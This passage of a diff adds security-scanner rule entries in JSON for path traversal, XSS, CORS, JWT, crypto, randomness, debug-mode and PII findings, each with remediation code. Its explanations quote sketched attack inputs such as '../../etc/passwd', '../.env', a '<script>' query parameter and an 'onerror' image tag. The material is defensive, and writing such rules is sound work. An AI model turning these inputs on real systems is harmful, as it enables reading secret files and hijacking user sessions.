+      "explanation": "A filename like ../../etc/passwd or ../.env walks out of the intended folder, so an attacker can read secrets or overwrite files.",
+      "steps": [
+        "Resolve the path and check it stays inside an allowed base directory.",
+        "Prefer looking files up by id instead of accepting names."
+      ],
+      "languages": [
+        "python"
+      ],
+      "fix": {
+        "python": "from pathlib import Path\n\nBASE = Path(\"/srv/files\").resolve()\n\n\ndef read_user_file(name):\n    target = (BASE / name).resolve()\n    if not target.is_relative_to(BASE):\n        raise ValueError(\"path escapes base directory\")\n    return target.read_text()\n"
+      }
+    },
+    {
+      "id": "CM-A008",
+      "title": "Reflected XSS: unescaped request data in HTML",
+      "category": "code",
+      "severity": "high",
+      "cwe": "CWE-79",
+      "description": "Request data is placed into HTML (f-string, render_template_string, Markup) without escaping.",
+      "generic": false,
+      "explanation": "When request parameters are pasted into HTML unescaped, a link like ?name=<script>...</script> runs JavaScript in the victim's browser. The script can steal their session or act as them.",
+      "steps": [
+        "Render templates with autoescaping (render_template with Jinja2).",
+        "Wrap values in markupsafe.escape() when building HTML by hand.",
+        "Never pass request data to Markup() or render_template_string()."
+      ],
+      "languages": [
+        "python"
+      ],
+      "fix": {
+        "python": "from flask import Flask, request\nfrom markupsafe import escape\n\napp = Flask(__name__)\n\n\n@app.get(\"/hello\")\ndef hello():\n    name = request.args.get(\"name\", \"\")\n    return f\"<h1>Hello {escape(name)}</h1>\"\n"
+      }
+    },
+    {
+      "id": "CM-J001",
+      "title": "DOM XSS via innerHTML",
+      "category": "code",
+      "severity": "high",
+      "cwe": "CWE-79",
+      "description": "Non-literal, unsanitized values written to innerHTML / outerHTML / insertAdjacentHTML / document.write / dangerouslySetInnerHTML.",
+      "generic": false,
+      "explanation": "innerHTML parses its input as HTML, so a value like <img src=x onerror=...> runs script in the page with full access to the user's session.",
+      "steps": [
+        "Use textContent for text.",
+        "If markup is required, sanitize it with DOMPurify.sanitize() first.",
+        "In React, render values as children instead of dangerouslySetInnerHTML."
+      ],
+      "languages": [
+        "javascript",
+        "typescript"
+      ],
+      "fix": {
+        "javascript": "function showName(el, name) {\n  el.textContent = name // or DOMPurify.sanitize(html) if markup is required\n}\n"
+      }
+    },
+    {
+      "id": "CM-J006",
+      "title": "Reflected XSS: request data in HTML response",
+      "category": "code",
+      "severity": "high",
+      "cwe": "CWE-79",
+      "description": "An Express handler sends HTML built from req.query / req.params / req.body without escaping.",
+      "generic": false,
+      "explanation": "A crafted link puts <script> into the response page, which runs in the victim's browser with their cookies and session.",
+      "steps": [
+        "Render with a template engine that escapes by default.",
+        "Escape values with an HTML-escaping helper before concatenating.",
+        "Send JSON (res.json) for data endpoints."
+      ],
+      "languages": [
+        "javascript",
+        "typescript"
+      ],
+      "fix": {
+        "javascript": "const escapeHtml = (s) => String(s).replace(/[&<>\"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '\"': '&quot;', \"'\": '&#39;' })[c])\n\nfunction hello(req, res) {\n  res.send(`<h1>Hello ${escapeHtml(req.query.name)}</h1>`)\n}\n"
+      }
+    },
+    {
+      "id": "CM-J004",
+      "title": "CORS wildcard with credentials",
+      "category": "code",
+      "severity": "high",
+      "cwe": "CWE-942",
+      "description": "Any-origin CORS (Access-Control-Allow-Origin: *, reflected origin) together with credentials exposes authenticated data.",
+      "generic": false,
+      "explanation": "When any origin may make credentialed requests, a malicious site visited by a logged-in user can read their data from your API.",
+      "steps": [
+        "List the exact origins you trust.",
+        "Only enable credentials for those origins."
+      ],
+      "languages": [
+        "javascript",
+        "typescript",
+        "python"
+      ],
+      "fix": {
+        "python": "from fastapi import FastAPI\nfrom fastapi.middleware.cors import CORSMiddleware\n\napp = FastAPI()\napp.add_middleware(CORSMiddleware, allow_origins=[\"https://app.example.com\"], allow_credentials=True)\n",
+        "javascript": "const cors = require('cors')\n\nconst corsMiddleware = cors({ origin: ['https://app.example.com'], credentials: true })\n"
+      }
+    },
+    {
+      "id": "CM-C004",
+      "title": "Permissive CORS policy (any origin)",
+      "category": "code",
+      "severity": "medium",
+      "cwe": "CWE-942",
+      "description": "CORS configured to allow every origin (cors() with no options, origin: '*', CORS(app), allow_origins=['*']).",
+      "generic": false,
+      "explanation": "Allowing every origin lets any website call your API from a visitor's browser and read the responses. It is safe only for genuinely public, unauthenticated data.",
+      "steps": [
+        "Restrict origins to the frontends you own.",
+        "Keep wildcard CORS only for public, read-only endpoints."
+      ],
+      "languages": [
+        "javascript",
+        "typescript",
+        "python"
+      ],
+      "fix": {
+        "python": "from flask import Flask\nfrom flask_cors import CORS\n\napp = Flask(__name__)\nCORS(app, origins=[\"https://app.example.com\"])\n",
+        "javascript": "const cors = require('cors')\n\nconst corsMiddleware = cors({ origin: ['https://app.example.com'] })\n"
+      },
+      "superseded_by": [
+        "CM-J004"
+      ]
+    },
+    {
+      "id": "CM-J005",
+      "title": "JWT decoded without verification",
+      "category": "code",
+      "severity": "high",
+      "cwe": "CWE-347",
+      "description": "jwt.decode trusts a token without verifying its signature, or alg 'none' is accepted.",
+      "generic": false,
+      "explanation": "Decoding is not verifying. An attacker edits the token payload to role: admin and the server believes it.",
+      "steps": [
+        "Use jwt.verify with the secret and an explicit algorithms allowlist.",
+        "Never accept alg 'none'."
+      ],
+      "languages": [
+        "javascript",
+        "typescript"
+      ],
+      "fix": {
+        "javascript": "const jwt = require('jsonwebtoken')\n\nfunction readToken(token) {\n  return jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] })\n}\n"
+      }
+    },
+    {
+      "id": "CM-C001",
+      "title": "Broken cipher or insecure mode",
+      "category": "code",
+      "severity": "high",
+      "cwe": "CWE-327",
+      "description": "DES / 3DES / RC4 / Blowfish ciphers, ECB mode, or Node's deprecated crypto.createCipher (no IV).",
+      "generic": false,
+      "explanation": "These ciphers and modes are broken or leak patterns in the plaintext. ECB encrypts identical blocks identically, and createCipher derives a key from a password with MD5 and no IV.",
+      "steps": [
+        "Use AES-256-GCM (or ChaCha20-Poly1305) with a random nonce per message.",
+        "Use a vetted library (cryptography / libsodium) rather than raw primitives."
+      ],
+      "languages": [
+        "python",
+        "javascript",
+        "typescript"
+      ],
+      "fix": {
+        "python": "import os\n\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\n\n\ndef encrypt(key: bytes, plaintext: bytes) -> bytes:\n    nonce = os.urandom(12)\n    return nonce + AESGCM(key).encrypt(nonce, plaintext, None)\n",
+        "javascript": "const crypto = require('crypto')\n\nfunction encrypt(key, plaintext) {\n  const iv = crypto.randomBytes(12)\n  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv)\n  const data = Buffer.concat([cipher.update(plaintext), cipher.final()])\n  return Buffer.concat([iv, cipher.getAuthTag(), data])\n}\n"
+      }
+    },
+    {
+      "id": "CM-C002",
+      "title": "Insecure randomness for security values",
+      "category": "code",
+      "severity": "medium",
+      "cwe": "CWE-330",
+      "description": "Math.random() or Python's random module used to generate tokens, passwords, OTPs, keys, salts or session ids.",
+      "generic": false,
+      "explanation": "Math.random and Python's random are predictable. Someone who sees a few outputs can predict the next reset token or session id.",
+      "steps": [
+        "Python: use secrets.token_urlsafe() / secrets.choice().",
+        "Node: use crypto.randomBytes() / crypto.randomUUID()."
+      ],
+      "languages": [
+        "python",
+        "javascript",
+        "typescript"
+      ],
+      "fix": {
+        "python": "import secrets\n\n\ndef new_reset_token():\n    return secrets.token_urlsafe(32)\n",
+        "javascript": "const crypto = require('crypto')\n\nfunction newResetToken() {\n  return crypto.randomBytes(32).toString('base64url')\n}\n"
+      }
+    },
+    {
+      "id": "CM-C003",
+      "title": "Debug mode enabled in configuration",
+      "category": "code",
+      "severity": "medium",
+      "cwe": "CWE-489",
+      "description": "Framework debug flags hardcoded on: Django DEBUG = True, FastAPI(debug=True), app.debug = True, app.config['DEBUG'] = True.",
+      "generic": false,
+      "explanation": "Debug mode shows stack traces, settings and sometimes environment variables to anyone who triggers an error, which hands attackers a map of your app.",
+      "steps": [
+        "Read debug flags from the environment, defaulting to off.",
+        "Use separate settings for development and production."
+      ],
+      "languages": [
+        "python"
+      ],
+      "fix": {
+        "python": "import os\n\nDEBUG = os.environ.get(\"DJANGO_DEBUG\") == \"1\"  # off unless explicitly enabled\n",
+        "javascript": "const express = require('express')\n\nconst app = express()\napp.set('env', process.env.NODE_ENV || 'production')\n"
+      }
+    },
+    {
+      "id": "CM-P008",
+      "title": "Sensitive personal data stored in plaintext",
+      "category": "pii",
+      "severity": "high",
+      "cwe": "CWE-312",
+      "description": "SSN, date of birth, passport or card numbers written to a database column or model field with no encryption.",
+      "generic": false,
+      "explanation": "If the database, a backup or a log of queries leaks, plaintext SSNs and birth dates are enough for identity theft. Breach-notification laws usually apply.",
+      "steps": [
+        "Don't collect the field if you don't need it.",
+        "Encrypt the column with an application-level key (Fernet, AES-GCM) kept outside the database.",
+        "Restrict which services can decrypt it."
+      ],
+      "languages": [
+        "python",
+        "javascript",
+        "typescript",
+        "sql"
+      ],
+      "fix": {
+        "python": "import os\n\nfrom cryptography.fernet import Fernet\n\nfernet = Fernet(os.environ[\"PII_ENCRYPTION_KEY\"])\n\n\ndef save_user(cur, name, dob):\n    cur.execute(\"INSERT INTO users (name, dob_encrypted) VALUES (?, ?)\", (name, fernet.encrypt(dob.encode())))\n",
+        "javascript": "const crypto = require('crypto')\n\nfunction encryptField(plaintext) {\n  const key = Buffer.from(process.env.PII_ENCRYPTION_KEY, 'base64')\n  const iv = crypto.randomBytes(12)\n  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv)\n  const data = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()])\n  return Buffer.concat([iv, cipher.getAuthTag(), data]).toString('base64')\n}\n"
+      }
+    }
+  ]
+}
